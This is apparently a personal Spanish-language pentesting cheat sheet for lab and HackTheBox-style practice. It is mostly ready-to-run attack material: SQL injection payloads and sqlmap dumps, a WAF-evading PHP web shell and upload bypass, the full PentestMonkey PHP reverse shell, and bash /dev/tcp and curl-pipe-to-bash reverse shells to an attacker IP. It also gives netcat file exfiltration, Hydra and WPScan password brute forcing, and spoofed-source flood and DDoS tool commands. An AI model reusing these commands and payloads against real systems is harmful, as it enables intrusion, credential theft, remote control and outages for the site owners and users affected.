Indice:

1. arp-scan--------------------------------------------------------------------------------------------------------------------
2. nmap y curl-----------------------------------------------------------------------------------------------------------------
3. Rutas wordpress peligrosas--------------------------------------------------------------------------------------------------
4. base 64---------------------------------------------------------------------------------------------------------------------
5. Reconocimiento y Ataque SQL-------------------------------------------------------------------------------------------------
6. Inyecciones SQL en URL y Maneras de conectarnos por MySQL-------------------------------------------------------------------
7. Inyecciones de tiempo-------------------------------------------------------------------------------------------------------
8. SQLMAP----------------------------------------------------------------------------------------------------------------------
9. Type Jugling (ver si cambiando el texto podemos lograr burlar la comparativa)-----------------------------------------------
10. LOCAL FILE INCLUSION-------------------------------------------------------------------------------------------------------
11. Wrapers--------------------------------------------------------------------------------------------------------------------
12. Path traversal-------------------------------------------------------------------------------------------------------------
13. Captura de pantalla--------------------------------------------------------------------------------------------------------
14. SUBIDA DE ARCHIVOS:   (PHP INTERPRETA) + WAF-------------------------------------------------------------------------------
15. Tratamiento TTY------------------------------------------------------------------------------------------------------------
16. HERRAMIENTA: >>>>----GHIDRA---->-------------------------------------------------------------------------------------------
17. Buscar info en una imagen--------------------------------------------------------------------------------------------------
18. DIRECTORY LISTING----------------------------------------------------------------------------------------------------------
19. NETCAT   Y   ZIP-----------------------------------------------------------------------------------------------------------
20. (  Hydra  ) Cracking Passwords Wordpress-----------------------------------------------------------------------------------
21. (  WPScan  ) Cracking Passwords Wordpress----------------------------------------------------------------------------------
22. reverseShell.php desde plugin en Wordpress.---------------------------------------------------------------------------------

23. joomscan. -----------------------------------------------------------------------------------------------------------------
24. DDoS  Ataque de Denegación de servicio ------------------------------------------------------------------------------------
25. DDoS Herramienta overload de github ---------------------------------------------------------------------------------------

1. arp-scan--------------------------------------------------------------------------------------------------------------------
> arp-scan -I ens33 --localnet --ignoredups

> ping -c 3 <IP>


2. nmap y curl------------------------------------------------------------------------------------------------------------------
> nmap -p- --open -sS --min-rate=5000 -vvv -n 192.168.1.137 -oG allPorts

> nmap -sCV -p80 -v 192.168.1.137 -oN targeted

> nmap --script http-enum -p80 192.168.1.137 -oN webScan



-Ver si es vulnerable a xss:
Send text (web):
Comments: <script src="http://ipAtacante/test"></script>
(Comprobar si hay alguien leyendo y clicando en los mensajes para itentar robar la cookie de sesion...)



-Ver codigo fuente: Plugins..rutas..etc

> curl -s -X GET "http://192.168.1.137/index.php" 




3. Rutas wordpress peligrosas----------------------------------------------------------------------------------------------------
WORDPRESS:
-Probar rutas: como : /wp-admin    /wp-content/plugins    /wp-config.php    /xmlrpc.php    /robots.txt

-Si tiene el xmlrpc.php activo, podemos realizar ataques.




4. base 64---------------------------------------------------------------------------------------------------------------------
DECODIFICAR CADENA EN BASE 64
> echo -n "AwSADSDMFFUasidiJIJ==" | base64 -d; echo


5. Reconocimiento y Ataque SQL-------------------------------------------------------------------------------------------------
////////Reconocimientos con SQL:

////Manual:

SQL  -  LOGIN PANEL   |----[ , , , ]--->

COMPROBAR USUARIOS POTENCIALES Y RESPUESTAS EN PANELS DE LOGIN:

admin - admin 
(En los Blogs suelen aparecer usuarios..probar)
-Podriamos tratar de aplicar fuerza bruta con Burpsuite - Hydra - Wfuzz
-Montando script en Python

-O realizar ataque de SQL:

Username: rmichaels' or 1=1-- -
Password: rmichaels' or 1=1-- -

(otros:)  rmichaels' and 1=1-- -
		 
		  rmichaels' or '1'='1     (Sin cerrar comilla para la la propia quiery la cierre por detras)

		  rmichaels' and sleep(5)-- -    (Inyeccion tiempo)
		  rmichaels and sleep(5)-- -     (Sin comilla)
		        -En caso de que fuera de tiempo:
		        -Para comprobar si el primer caracter de la base de datos empieza por 'a', deberia tardar 5 segundos en responder, si no fuera, cargaria rapido.
		            rmichaels' and if(substr(database(),1,1)='a',sleep(5),1)--
                                                        2,1   d      
                                                        3,1   m
                                                   ...
                             (podemos usar un script que automatice la injeccion por tiempo:)  -> injeccion_tiempo.py





6. Inyecciones SQL en URL--------------------------------------------------------------------------------------------------------------
SQL  -  URL   |----[ , , , ]--->

/////////////
INJECCION EN URL:

-Ataque en campo de Login:
  G: User:';-- -
     Password:test

  G: User:' OR 1=1;-- -   (Puede darnos acceso en caso de ser vulnerable)
     Password:test


-En URL el ataque de injección seria:
  G: http://<IP>/dashboard.php?id=1'      (Peta buena señal)
  G: http://<IP>/dashboard.php?id=1' order by 2-- -
                                              3
                                              4
                                              6 
                                              7   (Peta, hay 6)
  G: http://<IP>/dashboard.php?id=1' union select 1,2,3,4,5,6-- -  
  G: http://<IP>/dashboard.php?id=' union select 1,2,3,4,5,6-- -    (Quito el 1)
  G: http://<IP>/dashboard.php?id=' union select 1,database(),3,4,5,6-- -

    -Podemos automatizar las inyecciones con SQLMAP



MANERAS DE CONECTARNOS POR MySQL : --------------------------------------------------------------------

---> MANERA 1: (Normal)

-Nos conectaremos con mysql:
>www-data@aragog:$> mysql -u root -p -h 10.0.2.12
>Password:  mySecr3tPass (En este caso ya dimos con la contraseña, pero en caso de NO TENERLA, podemos probar : vacio y dando a ENTER o con password, root, admin, admin123..)
>MariaDB >   
>  



Fuerza Bruta (solo tenemos user, sin password):
---> MANERA 2: Desde msfconsole:

> $ msfconsole
> msf6 > search mysql_login
     0    auxiliary/sccanner/mysql/mysql_login
> msf6 > use 0
> msf6 > set verbose false
> msf6 > set rhosts 10.0.2.12    (victima)
> msf6 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
> msf6 > run



---> MANERA 3:  Con Hydra
> $ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://10.0.2.12






7. Inyecciones de tiempo---------------------------------------------------------------------------------------------------------------
-INJECCION DE TIEMPO:
  G: http://<IP>/dashboard.php?id=1 and sleep(10)        (Si tarda en cargar es vulnerable)
                                    ^



8. SQLMAP-----------------------------------------------------------------------------------------------------------------------------
        ___
       __H__
 ___ ___[(]_____ ___ ___  
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   


>>>>------SQLMAP------->
///Automatizado:-----------------------------MANERA 1  -  DESDE URL

     1- Para conocer las bases de datos:
        (Debemos tener la cookie de sesion, que la podemos ver en Storage, una vez estamso logueados en la web arrastraremos un cookie de sesion.)
        
            >sqlmap -u 'http://<IP>/dashboard.php?id=1'--dbs --cookie "PHPSESSID=abcdcookieabcd" --batch   
           
         (En caso de saber que es mysql la BD, podemos indicarla):
         
            >sqlmap -u 'http://<IP>/dashboard.php?id=1'--dbs --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql
            
            
            
              **ESCANEO EXAUSTIVO**   (Algo mas lento)
                    >sqlmap -u 'http://<IP>/dashboard.php?id=1'--dbs --cookie "PHPSESSID=abcdcookieabcd" --dbms mysql --risk 3 --level 4      (risk 1-3;  level 1-5)
                    
                  
                    
     
     2- Para enumerar las tablas de una BD:
            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql -D darkhole_2 --tables
            
     3- Para enumerar las columnas de una tabla:
            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql -D darkhole_2 -T users --columns
            
     4- Para dumpear usuario y contraseñas:
            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql -D darkhole_2 -T users -C username,password --dump
                      (Muestra los users y passwords, en caso de estar haseados, aplica automaticamente fuerza bruta)

   
    **SHELL**
    -Podemos tratar de incluir una cadena dentro de una archivo dado:
     (Teniendo capacidad de escritura)
    
     ' union select 1, "<?php system($_GET['cmd']); ?>",3,4,5,6 into outfile "/var/www/html/cmd.php"-- -
     
                 G: http:<IP>/dashboard.php?id=' union select 1, "<?php system($_GET['cmd']); ?>",3,4,5,6 into outfile "/var/www/html/cmd.php"-- - (ENTER)
                 
                   (En caso de haber incluido el texto podremos apuntar a el desde la URL)
                   
       (Con sqlmap se hace asi:)            
            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --os-shell --batch     
            
            
            
--------------------------MANERA 2  -  DESDE PANEL DE LOGIN

    1- Desde el panel de login, interceptaremos la peticion:
            Username:test
            Password: test   (Enviar)
              
              -Burpsuite:
                POST / ...
                ...
                username=test&password=test    (Copio todo el contenido de la peticion, y crearé un archivo desde consola y pegaré el contenido:)
                
     2- Crearé un archivo con el contenido de la peticion:               
                     >nano request
                            POST / ...
                             ...
                            username=test&password=test
                            
     3- Lanzaré sqlmap indicando el archivo creado request:
                    >sqlmap -r request --threads 10 --batch --dbs 
                    
                    >sqlmap -r request --threads 10 --batch -D chat --tables
                    
                    >sqlmap -r request --threads 10 --batch -D chat -T user --dump
                                 
                     
    




/////////
-Probar ataque NoSQL

/////////
-Xpath inyection



9. Type Jugling (ver si cambiando el texto podemos lograr burlar la comparativa)---------------------------------------------------------
/////////
-Type Jugling (ver si cambiando el texto podemos lograr burlar la comparativa:
	-Interceptando la peticion de Login con Burpsuite:
		Username: rmichaels
		Password: test

				BURPSUITE:  POST /...
							...
							user=rmichaels&password=test   ->Cambio por ->   user=rmichaels&password[]=test   -> Fordward->  
////
http://<IP>/admin/cms.php?pagename=home   -> Cambiar por: -> http://<IP>/home.php
															 http://<IP>/home




10. LOCAL FILE INCLUSION-----------------------------------------------------------------------------------------------------------------
	
11. Wrapers-----------------------------------------------------------------------------------------------------------------------------													(No existe)
Usar wraper:						
http://<IP>/admin/cms.php?pagename=php://filter/convert.base64-encode/resource=upload    
							                       upload.php
							          	       upload%00    (añadiendo null byte)



12. Path traversal-----------------------------------------------------------------------------------------------------------------------------

Intentar path traversal:
http://<IP>/admin/cms.php?pagename=/etc/passwd
http://<IP>/admin/cms.php?pagename=../../../../../etc/paswd
http://<IP>/admin/cms.php?pagename=....//....//....//....//....//etc/paswd
http://<IP>/admin/cms.php?pagename=....//....//....//....//....//etc/paswd%00

http://<IP>/admin/cms.php?pagename=home'     (Le añadimos una comilla para ver si acontece un error en la BD)
(SI arroja error, probablemente sea vulnerable a injeccion SQL):Probar:
	http://<IP>/admin/cms.php?pagename=home' or 1=1-- -
	http://<IP>/admin/cms.php?pagename=home' and 1=1-- -
	http://<IP>/admin/cms.php?pagename=home' or '1'='1    (Booleana) ->cambia, entonces probamos:
		http://<IP>/admin/cms.php?pagename=home' or '1'='2								   
		http://<IP>/admin/cms.php?pagename=home' order by 10-- -   (Para comprobar cuantas columnas existen.. sino funciona podemos hacerlo con union select):
														   9 
														   8  ...
			http://<IP>/admin/cms.php?pagename=home' union select 1-- -
			http://<IP>/admin/cms.php?pagename=home' union select 1,2-- -
			http://<IP>/admin/cms.php?pagename=home' union select 1,2,3-- -      ...  (pero sigue dandonos el error..)
			
(válida)->  http://<IP>/admin/cms.php?pagename=home' or '1'='1     (Muestra mensaje: Under cnstrucction; cambia del resto, por tanto funciona)
		   -Para saber cuál es el nombre de la base actual en uso podría hacer:
			http://<IP>/admin/cms.php?pagename=home' or substring(database(),1,1)='a  -> True; (Le digo si el primer caracter de la BD es igual a 'a' dame un true. 
			    Me devuelve el mensaje Under construcction; por tanto es true, el primer caracter es una a.
			    Si probaramos con otra letra devolveria el error.
			    Por tanto ya se que el primer caracter es 'a', podria intuir 'admin', probaria los siguientes para averiguar el nombre de la base de datos:
			        http://<IP>/admin/cms.php?pagename=home' or substring(database(),2,1)='d  -> True;
			                                                                         3,1)='m  -> True;   ... asi para admin.
			-Para tratar de dumpear los nombres de todas las bases de datos, tablas..etc, podriamos usar:
			    con Burpsuite interceptamos la ultima peticion: y dentro estara la Cookie: PHPSESSID=3tubvuhchvv49beg3rhiv4pj23
	                -Podriamos hacer un curl a la peticion, pero debemos indicarle el PHPSESSID:
	                 > curl -s-X GET "http://<IP>/admin/cms.php" -H "Cookie: PHPSESSID=3tubvuhchvv49beg3rhiv4pj23"
	                       (devuelve la peticion)
	                -Nos crearemos un script:  (sqli.py)
                       (Al ejecutar muestra 'admin')
                    -Creamos otro para enumerar todas las bases de datos:   (sqly_BD.py)
                       (Devuelve el nombre de todas las bases de datos)
                       
                    -Crearemos otro para enumerar todas las tablas de una base de datos:  (sqly_tables.py)
                        (devuelve 'pages')
                    -Ahora crearemos otro para enumerar las columnas de dicha tabla:   (sqly_columns.py)
                       (Devuelve 'id,pagename,pagedata')
                    -Ahora para ver lo que valen : pagename y pagedata , haremos:    (sqly_datafinal.py)
                        (Devuelve: 'disavowlist,home,tutorials-incomplete,upload' vemos un nuevo directorio del nav, qu no aparece (tutorials-incomplete))
                          -Lo probaremos en la URL:





13. Captura de pantalla----------------------------------------------------------------------------------------------------------------------------
///////
-Para tomar una CAPTURA DE PANTALLA:
   >sudo apt install flameshot
   sleep 4; flameshot gui
       (A los 4 segundos permite seleccionar y guardar una captura de lo que tengamos delante)
 
 
 
 
14. SUBIDA DE ARCHIVOS:   (PHP INTERPRETA) + WAF-----------------------------------------------------------------------------------------------------------------------------  
    
/////////
SUBIDA DE ARCHIVOS:   (PHP INTERPRETA)
G: http://<Ip>/administrator/upload.php  (imaginemos que en esta ruta hay una pagina que permite subir un archivo)(Vemos que interpreta el php...por tanto el archivo
que tratare de incluir será una reverse shell en php):

-Al subir un archivo se pueden estar validando varias cosas..:
    -Primero crearé un archivo php que me permita controlar el comando a insertar, y trataré de subirlo:
        > nano cmd.php
        -----------------------------
            <?php
                system($GET['cmd']);
            ?>
        -----------------------------    
                ->SUBIR:  cmd.php
                    (Devuelve error...) X 
                    
    -Puede que esté leyendo magic numbers:   (Añado  GIF8;)
        -----------------------------
            GIF8;
            <?php
                system($GET['cmd']);
            ?>
        -----------------------------    
                ->SUBIR:  cmd.php
                    (Devuelve error...) X 
          
          
-Interceptaremos la subida con burpsuite para tratar de subir un archivo php
        Burpsuite:  POST /administrator/upload.php
                       ...
                    Content-Type: image/jpg
                       ...
                    GIF8;
                    <?php
                    system($GET['cmd']);
                    ?>
                    
                    ->FORDWARD ->  (Error)  X
   ** WAF **
    Error Waf detected malware... system php function detected  -> Nos indica que system no lo permite, 
    -Existen maneras de camuflar el system:
    
            <?php                           <?php
                system($GET['cmd']); --->       $c=$_GET['cmd'];
            ?>                                  echo `$c`;
                                            ?>  
    
        (En lugar de system, creo una variable c, y luego hago una lamada a c, que ejecuta su comando)
       -Otra manera es convertir la palabra system a una cadena de texto hexadecimal:
            
            <?php                                           <?php
                "system"("who"); ---> En hexadecimal: -->      #"system" in hex: 73 79 73 74 65 6d
            ?>                                                 "\x73\x79\x73\x74\x65\x5d"("who");
                                                            ?>
                                               (Ambos funcionan)
         -De esta manera puedo pasarle el comando que yo quiera ejecutar:
           
             <?php
                "\x73\x79\x73\x74\x65\x5d"($_GET['cmd']);
             ?>
             
        -Volveremos a subir con burpsuite, indicando en el campo 'filename=cmd.gif', nuestro cmd es .php, pero en burpsuite le indicaremos que es de tipo gif...:
        
            Burpsuite:  POST /administrator/upload.php
                       ...
                    ...filename= cmd.gif         <--
                    Content-Type: image/jpg
                       ...
                    GIF8;
                      <?php
                        "\x73\x79\x73\x74\x65\x5d"($_GET['cmd']);    <--
                      ?>
                    
                    ->FORDWARD ->  (ok, subido)
                  
              -Nos iremos a la URL, y desde el directorio que contenga las subidas, apuntaremos al archivo, y trataremos de ejeccutar el comando:
                    G: http://<IP>/imfadministrator/uploads/miarchivo_cmd.gif
                            (Vemos que se está interpretando el php, por que solo aparece GIF-8)
                    G: http://<IP>/imfadministrator/uploads/miarchivo_cmd.gif?cmd=whoami
                            www-data     (¡Podemos ejecutar comandos!)
              -Nos mandaremos una bash al puerto 443, desde el que me pondré en escucha:
                    G: http://<IP>/imfadministrator/uploads/miarchivo_cmd.gif?cmd=bash -c "bash -i >%26/dev/tcp/<Mi IP>/443 0>%261"
                            
                                       -Por otro lado estando en escucha.
                                            >nc -nvlp 443
                                                (Listenning....)
                                                www-data:$> whoami
                                                    www-data
15. Tratamiento TTY-----------------------------------------------------------------------------------------------------------------------------
  -TRATAMIENTO TTY                         -Ahora haremos TRATAMIENTO TTY:
                                                           >script /dev/null -c bash
                                                              (Ctrl+Z)
                                                                  
                                                                       >stty raw -echo; fg
                                                                                    reset xterm
                                                   www-data:$>export TERM=xterm
                                                             >export SHELL=bash                  
                                                             >stty rows 44 columns 184      
    
    
                                                            -Ver que servicios estan corriendo en la maquinas/puertos:
                                                              >netstat -nat
                                                                  tcp    0    0 127.0.0.1:3306    0.0.0.0      LISTEN 
                                                                  tcp    0    0 0.0.0.1:7788      0.0.0.0      LISTEN     <--
                                                                  ...
                                                               
                                                             
                                                            -Intentar conectarnos a la maquina por el puerto 7788:
                                                               >nc localhost 7788
                                                                            Agent ID:     (conecta)

                                                            -Ver si hay servicio corriendo por nombre:
                                                               >ps -faux | grep nombre_proceso

                                                            -Ver las capabilities:
                                                               >getcap /usr/local/bin/agent  

                                                            -Para analizar un binario. Se puede usar Ghidra:
16. HERRAMIENTA: >>>>----GHIDRA---->----------------------------------------------------------------------------------------------------------------

HERRAMIENTA:
>>>>----GHIDRA----> Herramienta de ingenieria inversa de software desarrollada por la NSA.
Download: https://github.com/NationalSecurityAgency/ghidra

(Debemos descargar el comprimido  .zip)
   
   
   
   
    
17. Buscar info en una imagen------------------------------------------------------------------------------------------------------------------------                     
///////////////                      
-BUSCAR INFO EN UNA IMAGEN:
    >ls
      img.jpg
-Ver metadatos de una imagen:
    >exiftool img.jpg                 
               
-Listar las cadenas de caracteres imprimibles de la imagen:
    >strings img.jpg

-Ver información oculta en bits de la imagen:   
    >steghide info img.jpg
           (puede solicitar contraseña)
         oculto.txt   (Existe un archivo oculto)
   -Puedo extraerlo introduciendo la contraseña:
        >steghide extract -sf img.jpg
            (Se extraen los archivos) -> backup.zip
       -Descomprimimos el .zip:
        > unzip backup.zip
            Contraseña: (Introduzco contraseña) (Extrae el archivo)

    *(En caso de no conocer la contraseña):
        > zip2john backup.zip > hash
          (Crea el archivo hash, ahora trataremos de crakearlo con john)
        > john --wordlist=/usr/share/wordlists/rockyou.txt hash
           (Buscará la contraseña)

////////////////


18. DIRECTORY LISTING-------------------------------------------------------------------------------------------------------------
DIRECTORY LISTING:
-En caso de poder tener acceso a directory listing, yo puedo traerme el contenido a mi pc local:
   > wget -r http://<IP>/.git/
        (Descarga en una carpeta todo el contenido del directory listing.)


19. NETCAT   Y   ZIP-------------------------------------------------------------------------------------------------------------
////////////////////////////////////////
NETCAT   Y   ZIP  :

-COnectar y transferir archivos con netcat:

1ºConsola Victima:                     2ºConsola atacante en escucha:             
> ls 
    secreto.zip                    
> nc 10.10.14.4 < secreto.zip          > sudo nc -nvlp 443 > comprimido.zip 
        (MI IP) (manda el archivo)            (recibo el archivo y renombro)
                                       > ls
                                           comprimido.zip

					  -Para ver que hay dentro:
						> 7z l comprimido.zip
						      Date      Time    Attr         Size   Compressed  Name
							------------------- ----- ------------ ------------  ------------------------
							2023-05-24 05:51:31 .....    253395188     87387677  KeePassDumpFull.dmp
							------------------- ----- ------------ ------------  ------------------------

				          -Para descomprimir:
						> 7z x comprimido.zip
   							(Descomprime:)
 

////////////////////////////////////////





20. (  Hydra  ) Cracking Passwords Wordpress----------------------------------------------------------------------------------
 
Enlaces de interes de info:
       https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/
       https://www.nubetia.com/hydra-wordpress-ataque-fuerza-bruta/


***
Antes que cualquier cosa, es necesario entender como funciona Hydra. Básicamente Hydra funciona con el siguiente comando: 

> hydra -L /diccionario/usuarios.txt -P /diccionario/contrasenas.txt sitiovictima.com  -V https-form-post ‘wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location’



-L: quiere decir que utilizara el archivo de la lista de usuarios. Si pones la “L” minúscula “l” podrás poner el usuario (en caso de saber el usuario de la víctima).
-P: quiere decir que utilizara el archivo de la lista de contraseñas.
-V: quiere decir que estará en modo “vervose” pero como es mayúscula “-V” mostrara cada 1 de los intentos y solo te pondrá en verde el correcto. En caso de no querer ver la lista de todos los intentos poner la “-V” en minúscula así  “-v”.


https-form-post: es 1 de los muchos diferentes servicios soportados y que hydra te permitirá atacar. 
‘wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location’: es como el WordPress manda la info mediante el metodo POST de la pagina wp-login.php e intenta acceder al admin wp-admin.php.
***



-Creando un archivo de posibles usuarios en user.txt--------

> nano user.txt
-----------
admin
raul
david
juan
user
usuario
prueba
...
-----------
                                                                            (La ruta exacta la veremos interceptando la peticion del login con Burpsuite)
> sudo hydra -L user.txt -p prueba 10.10.10.10 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
              ^           ^                                                        ^           ^                          ^
(Diccionario de user)   (contraseña encontrada)                                                                      Aqui pondré el mensaje de error que devuelve WP




-En caso de no conocer contraseña pero si un usuario:-----------

> sudo hydra -l admin -P /ruta/diccionario/contrasenas.txt 10.10.10.10 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
              ^  ^     ^   ^                                                                 
(En caso de que el panel no arroje mensaje de error, y se aplique un redireccionamiento:)
(El mensaje final debe ser:    ....&pwd=^PASS^&wp-submit=Log+In:S=302"

EJPT Diccionarios de constraseñas, podemos usar---> /usr/share/wordlists/rockyou.txt 
EJPT -------------------------------->              /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  
EJPT -------------------------------->              /usr/share/metasploit-framework/data/wordlists/unix_users.txt  



-También podemos probar doble diccionario, y probar conexion por SSH:-------------------
MANERA 1:

> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
         ^            ^                                               ^
MANERA 2:
> hydra   "          "         "         "          "    ssh://10.10.10.10



-También podem  os probar doble diccionario, y probar conexion por MySQL:-----------------
> hydra   "        "         "         "          "    mysql://10.10.10.10



ATAQUE DE FUERZA BRUTA A SMB CON HYDRA: ------------------------------------------------
> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10
(Si da errores no es compatible..)




ATAQUE DE FUERZA BRUTA A FTP CON HYDRA: ------------------------------------------------
> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10


--------------------------------------------------------------------------------------------------------------------------



21. (  WPScan  ) Cracking Passwords Wordpress----------------------------------------------------------------------------------

-Sabiendo usuario:

> sudo wpscan --url https://10.10.10.10 -U admin -P /usr/share/wordlists/rockyou.txt



22.reverseShell.php desde plugin en Wordpress.----------------------------------------------------

Una vez DENTRO DE WORDPRESS:
- -> Plugins -> Editar codigo--> Pegamos la reverseShell.php ( de PentestMonkey con nuestra IP y puerto 4444)
-->Nos ponemos en escucha con netcat. $> nc -nvlp 4444
-->Guardamos el código --> Volvemos a los Plugins y lo activamos--> 'Activar'
--> Recibimos la conexión en nuestra máquina

-----------(reverseShell.php)--------------

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

------------------------------------------------------------------------------------------------------------ 

23. joomscan. -----------------------------------------------------------------------------------------------------------------
(Ver maquina de HTB  Devvortex)

-Ruta para ver version de joomla:

/administrator/manifests/files/joomla.xml   
<version>4.2.6</version>  (Buscar vulns con esa versión de joomla....)

-Ver informacion sensible de la BD:
> curl http://webjoomla.com/api/index.php/v1/config/application?public=true -vv
(Puede devolver info interesante o passwords)



UNA VEZ DENTRO DEL PANEL DE JOOMLA: 
-ir a :   System > Site Templates > 'TEMA?' Details and Files
                                                                   
Y en el archivo error.php, introducimos al llamada a descargar desde nuestra maquina atacante nuestra shell en PHP :
(Añadimos esta linea..)
<?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>    


-En nuestra maquina creamos la reverse shell en PHP, para que la ejecute..:
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh

-y compartimos servidor con python para que la descargue.
> python3 -m http.server 8080

-Nos ponemos en escucha con netcat:

-Ejecutamos un curl al error para que se cargue el comando que añadimos:
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"

(Recibiremos la shell en la consola de netcat)



24. DDoS  Ataque de Denegación de servicio ------------------------------------------------------------------------------------

> sudo hping3 --icmp --rand-source --flood -d 1400 10.10.10.10

(De esta manera desde multiples IP manda ataques a la victima. indicamos 1400 paquetes, el maximo es 1500.)
(La victima no podrá acceder a internet. No tendrá conexión)

25. DDoS Herramienta overload de github ---------------------------------------------------------------------------------------

G:  https://github.com/7zx/overload

> python3 overload.py

METHOD: HTTP
URL: https://webvictima.com
THREADS: 550
...
(Manda paquetes provocando la sobracarga...)

